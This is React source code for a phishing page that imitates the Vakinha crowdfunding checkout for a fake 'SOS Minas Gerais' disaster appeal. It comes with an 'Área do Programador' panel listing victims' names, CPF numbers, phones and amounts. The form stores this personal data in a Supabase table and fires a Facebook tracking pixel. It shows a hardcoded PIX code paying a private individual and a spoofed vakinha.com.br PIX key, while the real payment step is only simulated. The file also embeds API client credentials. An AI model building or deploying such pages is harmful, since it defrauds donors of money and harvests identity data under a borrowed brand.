      <header className="bg-gray-900 text-white shadow-sm sticky top-0 z-50 w-full">
        <div className="max-w-4xl mx-auto px-4 h-16 flex items-center justify-between">
          <div className="flex items-center gap-4">
            <button onClick={onBack} className="p-2 -ml-2 text-gray-400 hover:text-white hover:bg-gray-800 rounded-full transition-colors">
              <ArrowLeft size={24} />
            </button>
            <h1 className="font-bold text-lg flex items-center gap-2">
              <Lock size={18} className="text-green-400" />
              Área do Programador
            </h1>
          </div>
          <div className="text-xs bg-gray-800 px-3 py-1.5 rounded-full font-mono text-green-400 border border-gray-700">
            {cadastros.length} registros
          </div>
        </div>
      </header>

      <main className="flex-1 max-w-4xl w-full mx-auto px-4 py-8">
        <div className="mb-8">
          <h2 className="text-2xl font-black text-gray-900 mb-2">Cadastros Recebidos</h2>
          <p className="text-gray-600">Acompanhe em tempo real os dados preenchidos no formulário de pagamento.</p>
        </div>

        {isLoading ? (
          <div className="flex justify-center py-12">
            <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-green-500"></div>
          </div>
        ) : cadastros.length === 0 ? (
          <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-12 text-center">
            <Users size={48} className="mx-auto text-gray-300 mb-4" />
            <h3 className="text-lg font-bold text-gray-900 mb-2">Nenhum cadastro ainda</h3>
            <p className="text-gray-500">Os dados aparecerão aqui assim que alguém preencher o formulário.</p>
          </div>
        ) : (
          <div className="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
            <div className="overflow-x-auto">
              <table className="w-full text-left text-sm">
                <thead className="bg-gray-50 border-b border-gray-100 text-gray-600 font-bold uppercase text-xs tracking-wider">
                  <tr>
                    <th className="px-6 py-4">ID / Data</th>
                    <th className="px-6 py-4">Nome Completo</th>
                    <th className="px-6 py-4">CPF</th>
                    <th className="px-6 py-4">Telefone</th>
                    <th className="px-6 py-4 text-right">Valor</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-100">
                  {cadastros.map((cadastro, idx) => (
                    <tr key={idx} className="hover:bg-gray-50 transition-colors">
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div className="font-mono font-bold text-gray-900">#{cadastro.id || '---'}</div>
                        <div className="text-xs text-gray-500 flex items-center gap-1 mt-1">
                          <Calendar size={12} />
                          {new Date(cadastro.created_at || new Date()).toLocaleString('pt-BR')}
                        </div>
                      </td>
                      <td className="px-6 py-4 font-medium text-gray-900">
                        {cadastro.nome}
                      </td>
                      <td className="px-6 py-4 font-mono text-gray-600">
                        {cadastro.cpf}
                      </td>
                      <td className="px-6 py-4 font-mono text-gray-600">
                        {cadastro.telefone}
                      </td>
                      <td className="px-6 py-4 text-right whitespace-nowrap">
                        <div className="inline-flex items-center gap-1 bg-green-50 text-green-700 px-2.5 py-1 rounded-lg font-bold">
                          <DollarSign size={14} />
                          {Number(cadastro.valor || 0).toLocaleString('pt-BR', { minimumFractionDigits: 2 })}
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}

function PaymentPage({ onBack, initialValue }: { onBack: () => void, initialValue: string }) {
  const [pixGenerated, setPixGenerated] = useState(false);
  const [value, setValue] = useState(initialValue);
  const [copied, setCopied] = useState(false);
  
  // Form state
  const [nome, setNome] = useState('');
  const [cpf, setCpf] = useState('');
  const [telefone, setTelefone] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [turbine, setTurbine] = useState(false);
  const [receiveUpdates, setReceiveUpdates] = useState(false);

  const handleCopy = () => {
    navigator.clipboard.writeText('00020101021126580014br.gov.bcb.pix013659152353-c62f-42d1-aaff-6c7538b71ae95204000053039865802BR5918PAULO R DA S SOUSA6008TRINDADE62070503***63045F6E');
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleGeneratePix = async () => {
    if (!nome || !cpf || !telefone || !value) return;
    
    setIsLoading(true);
    try {
      // 1. Salvar no banco de dados Supabase
      const { error: dbError } = await supabase
        .from('cadastros')
        .insert([
          { 
            nome, 
            cpf, 
            telefone, 
            valor: value 
          }
        ]);

      if (dbError) throw dbError;
      
      // 2. Disparar evento do Pixel do Facebook (InitiateCheckout)
      if (typeof window !== 'undefined' && window.fbq) {
        window.fbq('track', 'InitiateCheckout', {
          value: Number(value),
          currency: 'BRL'
        });
      }

      // 3. Gerar PIX via Sync Pay
      const clientId = '89210cff-1a37-4cd0-825d-45fecd8e77bb';
      const clientSecret = 'dadc1b2c-86ee-4256-845a-d1511de315bb';
      
      // Simulação
      await new Promise(resolve => setTimeout(resolve, 1500));
      
    } catch (error) {
      console.error('Erro ao processar:', error);
      alert('Houve um erro ao gerar seu PIX. Por favor, tente novamente.');
    } finally {
      setIsLoading(false);
      setPixGenerated(true);
    }
  };

  const totalValue = (Number(value) || 0) + (turbine ? 4.99 : 0);

  return (
    <div className="min-h-screen bg-white flex flex-col items-center font-sans text-gray-800 pb-12">
      {/* Header Fixo Checkout */}
      <header className="bg-white shadow-sm sticky top-0 z-50 w-full border-b border-gray-100">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
          <div className="flex items-center">
            <img src="https://seeklogo.com/images/V/vakinha-logo-88066E3580-seeklogo.com.png" alt="Vakinha Logo" className="h-8" referrerPolicy="no-referrer" />
          </div>
          
          <div className="flex items-center gap-4">
            <button className="text-[#1cb977] p-1 hover:bg-gray-50 rounded-full transition-colors">
              <Search size={24} />
            </button>
            <div className="w-10 h-10 bg-[#00a8c6] rounded-full flex items-center justify-center text-white font-bold text-sm cursor-pointer hover:bg-[#008ba3] transition-colors">
              FH
            </div>
          </div>
        </div>
      </header>

      <div className="w-full max-w-3xl px-4 mt-8">
        {/* Info da Campanha */}
        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-4 mb-6 flex items-center gap-4">
          <img src="https://midias.em.com.br/_midias/jpg/2026/02/24/1200x720/1_juiz-de-fora-cemig-desmente-que-havera-interrupcao-geral-de-energia-64640530.jpeg?20260224185555?20260224185555" alt="Campanha" className="w-16 h-16 rounded-xl object-cover" referrerPolicy="no-referrer" />
          <div>
            <p className="text-xs text-gray-500 font-bold uppercase tracking-wider mb-1">Você está apoiando</p>
            <h2 className="font-bold text-gray-900 leading-tight line-clamp-2">SOS Minas Gerais</h2>
          </div>
        </div>

        {!pixGenerated ? (
          <div className="space-y-6">
            <div className="text-sm text-gray-800">
              <span className="font-bold">Olá, Flávio Henrique.</span> Não é você? <a href="#" className="text-blue-600 underline">Clique aqui</a>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div>
                <label className="block text-sm font-bold text-gray-800 mb-2">Telefone (WhatsApp)</label>
                <input 
                  type="tel" 
                  placeholder="(00) 00000 0000" 
                  value={telefone}
                  onChange={(e) => setTelefone(e.target.value)}
                  className="w-full px-4 py-3 border border-gray-300 rounded-md focus:ring-1 focus:ring-[#1cb977] focus:border-[#1cb977] outline-none text-gray-900 transition-colors" 
                />
              </div>

              <div>
                <label className="block text-sm font-bold text-gray-800 mb-2">CPF</label>
                <input 
                  type="text" 
                  placeholder="000.000.000-00" 
                  value={cpf}
                  onChange={(e) => setCpf(e.target.value)}
                  className="w-full px-4 py-3 border border-gray-300 rounded-md focus:ring-1 focus:ring-[#1cb977] focus:border-[#1cb977] outline-none text-gray-900 transition-colors" 
                />
              </div>

              <div className="md:col-span-2">
                <label className="block text-sm font-bold text-gray-800 mb-2">Nome completo</label>
                <input 
                  type="text" 
                  placeholder="Flávio Henrique" 
                  value={nome}
                  onChange={(e) => setNome(e.target.value)}
                  className="w-full px-4 py-3 border border-gray-300 rounded-md focus:ring-1 focus:ring-[#1cb977] focus:border-[#1cb977] outline-none text-gray-900 transition-colors" 
                />
              </div>

              <div className="md:col-span-2">
                <label className="block text-sm font-bold text-gray-800 mb-2">Valor da contribuição</label>
                <div className="flex">
                  <span className="inline-flex items-center px-4 py-3 rounded-l-md border border-r-0 border-gray-300 bg-gray-50 text-gray-600 font-medium">
                    R$
                  </span>
                  <input 
                    type="number" 
                    placeholder="0,00" 
                    value={value}
                    onChange={(e) => setValue(e.target.value)}
                    className="flex-1 px-4 py-3 border border-gray-300 rounded-r-md focus:ring-1 focus:ring-[#1cb977] focus:border-[#1cb977] outline-none text-gray-900 transition-colors" 
                  />
                </div>
              </div>
            </div>

            <div>
              <label className="block text-sm font-bold text-gray-800 mb-3">Forma de pagamento</label>
              <div className="flex gap-3">
                <div className="flex-1 flex items-center justify-center gap-2 border border-[#1cb977] rounded-md py-3 px-4 cursor-pointer text-[#1cb977]">
                  <div className="w-4 h-4 rounded-full border border-[#1cb977]"></div>
                  <span className="font-medium text-sm">Cartão de crédito</span>
                </div>
                <div className="flex-1 flex items-center justify-center gap-2 bg-[#1cb977] rounded-md py-3 px-4 cursor-pointer text-white">
                  <div className="w-4 h-4 rounded-full border-2 border-white flex items-center justify-center">
                    <div className="w-2 h-2 bg-white rounded-full"></div>
                  </div>
                  <span className="font-medium text-sm">Pix</span>
                </div>
              </div>
            </div>

            <div className="bg-[#eefcf1] rounded-lg p-4 border border-[#c3f0d5]">
              <div className="flex items-center justify-between mb-4">
                <div className="flex items-center gap-2">
                  <input 
                    type="checkbox" 
                    checked={turbine}
                    onChange={(e) => setTurbine(e.target.checked)}
                    className="w-5 h-5 text-[#1cb977] border-gray-300 rounded focus:ring-[#1cb977]"
                  />
                  <span className="bg-[#1cb977] text-white text-xs font-bold px-2 py-1 rounded">TURBINE SUA DOAÇÃO</span>
                </div>
                <span className="font-bold text-[#1cb977]">+R$ 4,99</span>
              </div>
              
              <div className="bg-white rounded-md p-3 mb-2 flex items-start gap-3">
                <div className="text-xl">🍀</div>
                <div className="flex-1">
                  <div className="flex justify-between items-center">
                    <span className="font-bold text-sm text-gray-800">5 números da sorte</span>
                    <span className="text-xs text-gray-500">Grátis</span>
                  </div>
                  <p className="text-xs text-gray-600 mt-1">Você e quem criou a vaquinha concorrem ao sorteio de R$ 15.000,00 da Vakinha Premiada</p>
                </div>
              </div>

              <div className="bg-white rounded-md p-3 flex items-start gap-3">
                <div className="text-xl">💚</div>
                <div className="flex-1">
                  <div className="flex justify-between items-center">
                    <span className="font-bold text-sm text-gray-800">5 corações</span>
                    <span className="text-xs text-gray-500">R$ 4,99</span>
                  </div>
                  <p className="text-xs text-gray-600 mt-1">Destacam essa vaquinha na plataforma</p>
                </div>
              </div>
            </div>

            <div className="space-y-2 text-gray-600 pt-4">
              <div className="flex justify-between text-sm">
                <span>Contribuição:</span>
                <span>R$ {Number(value || 0).toFixed(2).replace('.', ',')}</span>
              </div>
              <div className="flex justify-between text-sm border-t border-gray-200 pt-2">
                <span>Total:</span>
                <span>R$ {totalValue.toFixed(2).replace('.', ',')}</span>
              </div>
            </div>

            <div className="flex items-start gap-3 pt-4">
              <input 
                type="checkbox" 
                checked={receiveUpdates}
                onChange={(e) => setReceiveUpdates(e.target.checked)}
                className="w-5 h-5 mt-0.5 text-[#1cb977] border-gray-300 rounded focus:ring-[#1cb977]"
              />
              <div>
                <p className="text-sm text-gray-800">Quero receber atualizações desta vaquinha e de outras iniciativas.</p>
                <p className="text-xs text-gray-500 mt-1">Respeitamos sua privacidade, enviando apenas e-mails e WhatsApp importantes.</p>
              </div>
            </div>

            <button 
              onClick={handleGeneratePix}
              disabled={!value || Number(value) <= 0 || !nome || !cpf || !telefone || isLoading}
              className="w-full bg-[#1cb977] hover:bg-[#189e65] disabled:bg-green-300 text-white font-bold py-4 rounded-md text-xl transition-colors shadow-sm"
            >
              {isLoading ? 'Processando...' : 'CONTRIBUIR'}
            </button>

            <div className="bg-gray-100 rounded-md p-4 flex items-center gap-4">
              <div className="bg-[#1a2b49] rounded-md px-3 py-2 flex items-center gap-2">
                <Lock size={18} className="text-yellow-400" />
                <div className="text-white text-xs font-bold leading-tight">
                  SELO DE<br/>SEGURANÇA
                </div>
              </div>
              <p className="text-sm text-[#1a2b49]">
                Garantimos uma <strong>experiência segura</strong> para todos os nossos doadores.
              </p>
            </div>

            <div className="text-xs text-gray-600 space-y-4 pb-8">
              <p>Ao clicar no botão acima você declara que é maior de 18 anos, leu e está de acordo com os <a href="#" className="text-blue-500">Termos, Taxas e Prazos</a></p>
              <p>Informamos que o preenchimento do seu cadastro completo estará disponível em seu painel pessoal na plataforma após a conclusão desta doação. Importante destacar a importância da adequação do seu cadastro, informando o nome social, caso o utilize</p>
            </div>
          </div>
        ) : (
          <div className="flex flex-col items-center space-y-6 animate-in fade-in zoom-in duration-300 bg-white p-8 rounded-xl shadow-sm border border-gray-100">
            <div className="text-center">
              <h2 className="font-bold text-2xl text-[#1a2b49] mb-2">Efetue o pagamento para confirmar a contribuição</h2>
            </div>

            <div className="flex items-start gap-4 bg-gray-50 p-4 rounded-lg w-full">
              <div className="text-gray-400">
                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>
              </div>
              <p className="text-sm text-gray-700">
                <strong>Clique no botão</strong> para <strong>copiar o código</strong> e escolha pagar via <strong>Pix Copia e Cola</strong> no aplicativo do seu banco.
              </p>
            </div>
            
            <div className="w-full">
              <div className="flex items-center border border-gray-300 rounded-md overflow-hidden">
                <div className="flex-1 p-3 font-mono text-sm text-gray-600 truncate bg-white">
                  00020101021126580014br.gov.bcb.pix013659152353-c62f-42d1-aaff-6c7538b71ae95204000053039865802BR5918PAULO R DA S SOUSA6008TRINDADE62070503***63045F6E
                </div>
                <button 
                  onClick={handleCopy}
                  className="p-3 bg-white border-l border-gray-300 hover:bg-gray-50 text-gray-600 transition-colors"
                >
                  {copied ? <Check size={20} className="text-green-500" /> : <Copy size={20} />}
                </button>
              </div>
            </div>

            <a href="#" className="text-sm text-gray-600 underline">Tudo certo, já paguei!</a>

            <div className="w-full text-left mt-8">
              <h3 className="font-bold text-gray-800 uppercase text-sm mb-2">NÃO CONSEGUIU USAR O CÓDIGO? DOE USANDO A CHAVE PIX!</h3>
              <p className="text-sm text-gray-600 mb-4">Copie a chave PIX exclusiva da vaquinha e transfira o valor via PIX, usando o aplicativo do seu banco.</p>
              
              <div className="flex items-center border border-gray-300 rounded-md overflow-hidden">
                <div className="flex-1 p-3 text-sm text-gray-800 bg-white">
                  5951671@vakinha.com.br
                </div>
                <button 
                  onClick={() => {
                    navigator.clipboard.writeText('5951671@vakinha.com.br');
                    setCopied(true);
                    setTimeout(() => setCopied(false), 2000);
                  }}
                  className="p-3 bg-white border-l border-gray-300 hover:bg-gray-50 text-gray-600 transition-colors"
                >
                  <Copy size={20} />
                </button>
              </div>
            </div>

            <div className="w-full bg-gray-100 p-6 rounded-lg flex flex-col items-center mt-6">
              <img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=00020101021126580014br.gov.bcb.pix013659152353-c62f-42d1-aaff-6c7538b71ae95204000053039865802BR5918PAULO%20R%20DA%20S%20SOUSA6008TRINDADE62070503***63045F6E" alt="QR Code PIX" className="w-48 h-48 mb-4 mix-blend-multiply" referrerPolicy="no-referrer" />
              <div className="text-center text-xs text-gray-700 space-y-1">
                <p>SOS Minas Gerais</p>
                <p>ID Vaquinha: 5951671</p>
                <p>ID Transação: {Math.floor(Math.random() * 100000000)}</p>
                <p>Data: {new Date().toLocaleDateString('pt-BR')}</p>
                <p>Valor: R$ {totalValue.toFixed(2).replace('.', ',')}</p>
                <p>Método: Pix</p>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
